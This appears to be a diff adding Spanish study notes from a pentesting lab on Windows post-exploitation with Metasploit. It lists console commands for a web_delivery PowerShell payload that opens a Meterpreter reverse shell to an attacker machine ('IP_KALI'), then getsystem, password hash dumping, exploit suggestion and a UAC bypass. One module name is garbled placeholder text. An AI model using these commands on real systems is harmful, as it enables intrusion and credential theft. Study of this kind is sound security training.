@@ -93,3 +93,53 @@ msf post(multi)> show options
 
 ## Meterpreter post-explotación windows
  
+- Vamos a usar otro módulo de metasploit que se llama web deliver y ejecutar un script manualmente desde windows para que nos devuelva unsa shell reversa
+- Windows tiene la IP .137 
+- En metasploit
+
+> msf> use exploit/multi/script/web_delivery
+> msf> show options
+
+- me pide el payload, el lhost...nos generará el payload automáticamente que deberé ejecutar en la máquina destino
+
+> msf> show targets
+> msf> set target powershell
+> msf> set payload windows/x64/meterpreter/reverse_tcp
+> msf> set lhost IP_KALI
+> exploit
+
+- Me genera el payload en pantalla y me dice de ejcitarlo en la máquina objetivo para obtener una shell reversa
+- Podría generar un ejecutable camuflado
+- No hace falta configurar un listener
+- Ejecuto el código en la powershell de windows
+- me abre un meterpreter
+
+> msf> session 1
+> meterpreter> getuid
+> meterpreter> getsystem -h (intentará subir privilegios)
+- Voy a los modulos de post /usr/share/metasploit-framework/modules/post/windows
+- Porque es util saber si es una máquina virtual? Puede ser un Honey Pot (trampa)
+
+> run /post/windows/gather/hashdump
+
+- Para conseguir permisos de admin mando esta sesión a background
+
+> meterpreter> background
+
+- Puedo hacer que metsploit me sugiera exploits
+> msf> use post/multi/recon/local_exploit_suggester
+> msf> set session 1
+> msf> exploit
+
+- A ver si asi averiguamos como podemos escalar privilegios
+- Sugiere uac_bypass
+> msf(local_exploit_suggester)> back
+> msf> use uac/kñklñk
+> msf(uac)> show options
+
+- El uac de windows es el popup cuando pregunta si permites darle permisos a la shell para hacer cambios en el equipo
+- El bypass nos permite saltarnos este uac
+etc... luego lo vemos!
+-----
+
+## Elevación de privilegios UAC
